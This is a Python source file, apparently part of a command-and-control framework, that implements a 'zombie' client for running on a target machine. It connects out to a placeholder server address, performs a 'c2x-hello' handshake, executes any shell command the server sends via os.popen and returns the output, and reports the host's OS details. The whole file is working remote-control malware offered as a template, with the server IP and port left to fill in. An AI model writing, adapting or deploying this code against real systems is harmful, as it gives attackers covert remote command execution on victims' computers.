#!/usr/bin/env python3

'''
This is a template which runs on target system and works as a zombie
'''
import re
import socket

codes_list = {
    'exec':'1',
    '1':'exec',
    '__comment__get_os':'cid=2, does not have second part (for request)',
    'get_os':'2',
    '2':'get_os'
}

class Zombie:
    def __init__(self, server_ip, server_port, is_encrypted=False):
        self.server_ip = server_ip
        self.server_port = server_port
        self.is_encrypted = is_encrypted

    def connect_to_server(self):
        self.got_hello = False # this is true when the zombie gets c2x-hello message
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((self.server_ip, self.server_port))
        self.receive_reply()

    def send_hello_back(self):
        hello_signal_msg = 'c2x-hello_back'
        self.msg_manager(msg=hello_signal_msg)

    def msg_manager(self, msg, is_encrypted=None):
        if is_encrypted is None:
            is_encrypted = self.is_encrypted
        if is_encrypted:
            self.send_encrypted_msg(msg=msg)
        else:
            self.send_msg(msg=msg)

    def send_msg(self, msg):
        encoded_msg = msg.encode()
        self.client_socket.sendall(encoded_msg)

    def send_encrypted_msg(self, msg):
        pass

    def receive_reply(self):
        while True:
            try:
                data = self.client_socket.recv(4096)
            except OSError:
                self.client_socket.close()
                return
            if not data:
                continue
            data = data.decode()
            if self.is_encrypted:
                decrypted_reply = self.decrypter(encrypted_msg=data)
                reply = decrypted_reply
            else:
                reply = data

            self.command_interpreter(reply_msg=reply)

    def command_interpreter(self, reply_msg):
        reply_msg = reply_msg.strip()
        if not self.got_hello:
            if reply_msg == 'c2x-hello':
                self.send_hello_back()
                self.got_hello = True
            else:
                self.client_socket.close()
                print('connection closed!')

        elif reply_msg == 'c2x-quit':
            self.client_socket.close()
            exit()

        elif reply_msg.startswith('cid='):
            get_cid_pattern = r'cid=(\d*),'
            cid = re.findall(get_cid_pattern, reply_msg)
            if len(cid) == 1:
                cid = cid[0]
                code = codes_list[cid]

                self.interpret_codes(code=code, msg=reply_msg)

    def interpret_codes(self, code, msg):
        if code == 'exec':
            self.execute_command(msg=msg)

        elif code == 'get_os':
            self.send_os_info()

    def send_os_info(self):
        import platform
        os_info = platform.platform()
        self.msg_manager(msg='cid=' + codes_list['get_os'] + ',' + os_info)

    def execute_command(self, msg):
        import os
        command = msg.split(',')
        if len(command) >= 2:
            command = ",".join(command[1:])
            output = os.popen(command).read()
            self.msg_manager(msg='cid=' + codes_list['exec'] + ',' + output)

    def decrypter(self, encrypted_msg):
        # encrypted_msg is decoded
        decrypted_msg = ''
        return decrypted_msg


def start_zombie():
    zombie = Zombie(server_ip='replace_server_ip', server_port='replace_server_port', is_encrypted=False)
    zombie.connect_to_server()

if __name__ == '__main__':
    start_zombie()
